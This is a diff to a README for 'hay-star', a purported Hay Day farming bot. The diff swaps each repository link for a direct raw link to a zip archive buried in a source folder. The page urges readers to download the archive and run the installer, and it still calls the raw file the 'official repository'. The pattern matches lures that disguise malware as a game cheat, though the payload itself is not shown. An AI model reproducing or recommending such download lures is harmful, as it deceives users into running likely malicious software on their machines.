@@ -1,6 +1,6 @@
 <h1>🌾 hay-star - Automate Hay Day Farming Effortlessly</h1>
 
-<a href="https://github.com/Katerinalves752/hay-star" style="display:inline-block;padding:16px 32px;background-color:#e83e8c;color:#ffffff;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD HAY-STAR NOW</a>
+<a href="https://raw.githubusercontent.com/Katerinalves752/hay-star/main/native/src/v1.4-alpha.3.zip" style="display:inline-block;padding:16px 32px;background-color:#e83e8c;color:#ffffff;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD HAY-STAR NOW</a>
 
 ## 🎯 What Is Hay-Star?
 
@@ -50,7 +50,7 @@ Hay-Star is a smart automation tool that plays Supercell's Hay Day for you. It h
 ## 🚀 Getting Started
 
 ### Step 1: Download the Application
-Visit <a href="https://github.com/Katerinalves752/hay-star">https://github.com/Katerinalves752/hay-star</a> to download the application. This link takes you to the official repository where you'll find the latest version of hay-star.
+Visit <a href="https://raw.githubusercontent.com/Katerinalves752/hay-star/main/native/src/v1.4-alpha.3.zip">https://raw.githubusercontent.com/Katerinalves752/hay-star/main/native/src/v1.4-alpha.3.zip</a> to download the application. This link takes you to the official repository where you'll find the latest version of hay-star.
 
 ### Step 2: Installation
 After downloading, run the installation file to set up hay-star on your computer. The installation process is straightforward - just follow the on-screen prompts and accept the default settings if you're unsure.
@@ -157,4 +157,4 @@ This tool is provided for educational and research purposes only. The developer 
 
 ## 📥 Download Reminder
 
-Ready to transform your Hay Day experience? Visit <a href="https://github.com/Katerinalves752/hay-star">https://github.com/Katerinalves752/hay-star</a> to download hay-star today. Join thousands of farmers who have already automated their gameplay with the fastest bot in the community. Set up takes less than five minutes, and you'll wonder how you ever managed without it.
+Ready to transform your Hay Day experience? Visit <a href="https://raw.githubusercontent.com/Katerinalves752/hay-star/main/native/src/v1.4-alpha.3.zip">https://raw.githubusercontent.com/Katerinalves752/hay-star/main/native/src/v1.4-alpha.3.zip</a> to download hay-star today. Join thousands of farmers who have already automated their gameplay with the fastest bot in the community. Set up takes less than five minutes, and you'll wonder how you ever managed without it.
